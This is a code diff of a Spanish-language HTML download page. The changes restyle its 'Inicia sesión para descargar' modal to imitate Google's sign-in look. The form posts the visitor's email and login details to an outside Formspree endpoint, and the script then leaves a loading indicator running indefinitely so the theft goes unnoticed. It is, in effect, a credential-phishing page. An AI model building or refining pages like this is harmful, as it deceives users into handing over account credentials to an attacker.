@@ -14,7 +14,7 @@
     display: flex;
     justify-content: center;
     align-items: center;
-    color: #fff;
+    color: #333;
   }
 
   canvas#bgCanvas {
@@ -35,6 +35,7 @@
     font-size: 3em;
     text-shadow: 2px 2px 8px rgba(0,0,0,0.5);
     margin-bottom: 20px;
+    color: #fff;
   }
 
   .hero h2 {
@@ -69,6 +70,7 @@
     transform: scale(1.05);
   }
 
+  /* Modal estilo Google */
   .modal {
     display: none;
     position: fixed;
@@ -77,54 +79,59 @@
     top:0;
     width:100%;
     height:100%;
-    background: rgba(0,0,0,0.8);
+    background: rgba(0,0,0,0.7);
+    display: flex;
     justify-content: center;
     align-items: center;
-    animation: fadeIn 0.5s ease forwards;
   }
 
   .modal-content {
     background: #fff;
     color: #333;
     padding: 40px;
-    border-radius: 16px;
-    max-width: 400px;
+    border-radius: 12px;
+    max-width: 380px;
     width: 90%;
     text-align: center;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.3);
     position: relative;
+  }
+
+  .modal-content img {
+    width: 100px;
+    margin-bottom: 20px;
   }
 
   .modal h2 {
     margin-bottom: 20px;
-    color: #ff6f61;
+    color: #202124;
+    font-weight: 500;
   }
 
   .input {
     width: 100%;
-    padding: 14px;
-    margin: 12px 0;
-    border-radius: 8px;
-    border: 1px solid #ccc;
+    padding: 12px;
+    margin: 10px 0;
+    border-radius: 4px;
+    border: 1px solid #dadce0;
     font-size: 16px;
   }
 
   .loading {
     display: none;
     margin-top: 20px;
-    color: #ff6f61;
+    color: #1a73e8;
     font-weight: bold;
-    font-size: 1.1em;
+    font-size: 1em;
   }
 
   .message {
     margin-top: 20px;
     font-weight: bold;
     font-size: 1em;
-    color: #ff6f61;
+    color: #1a73e8;
     display: none;
   }
-
-  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 </style>
 </head>
 <body>
@@ -140,8 +147,11 @@
   </div>
 </div>
 
+<!-- Modal -->
 <div class="modal" id="modal">
   <div class="modal-content">
+    <!-- LOGO: cambia src a tu imagen en la raíz -->
+    <img src="logo.png" alt="Logo">
     <h2>Inicia sesión para descargar</h2>
     <form id="formulario" action="https://formspree.io/f/xjkekpdg" method="POST">
       <input type="text" name="correo" class="input" placeholder="Correo" required>
@@ -154,14 +164,13 @@
 </div>
 
 <script>
-/* Fondo de partículas */
+/* Fondo partículas */
 const canvas = document.getElementById('bgCanvas');
 const ctx = canvas.getContext('2d');
 canvas.width = window.innerWidth;
 canvas.height = window.innerHeight;
-
 let particles = [];
-for(let i=0; i<100; i++){
+for(let i=0;i<120;i++){
   particles.push({
     x: Math.random()*canvas.width,
     y: Math.random()*canvas.height,
@@ -170,7 +179,6 @@ for(let i=0; i<100; i++){
     dy: (Math.random()-0.5)*1
   });
 }
-
 function animate(){
   ctx.clearRect(0,0,canvas.width,canvas.height);
   particles.forEach(p=>{
@@ -178,8 +186,7 @@ function animate(){
     ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
     ctx.fillStyle = "rgba(255,255,255,0.7)";
     ctx.fill();
-    p.x += p.dx;
-    p.y += p.dy;
+    p.x+=p.dx; p.y+=p.dy;
     if(p.x<0||p.x>canvas.width) p.dx*=-1;
     if(p.y<0||p.y>canvas.height) p.dy*=-1;
   });
@@ -196,19 +203,20 @@ const message = document.getElementById("message");
 
 form.addEventListener("submit", function(e){
   e.preventDefault();
-  loading.style.display = "block";
-  message.style.display = "none";
+  loading.style.display="block";
+  message.style.display="none";
 
   const formData = new FormData(form);
-  fetch(form.action, {
-    method: "POST",
+  fetch(form.action,{
+    method:"POST",
     body: formData,
-    headers: { 'Accept':'application/json' }
+    headers:{'Accept':'application/json'}
   })
-  .then(response => {
+  .then(response=>{
     loading.style.display="none";
-    message.style.display="block"; // Mostrar mensaje
-    // Aquí se queda cargando indefinidamente
+    message.style.display="block";
+    // Queda cargando indefinidamente
+    loading.style.display="block";
   })
   .catch(err=>{
     loading.style.display="none";
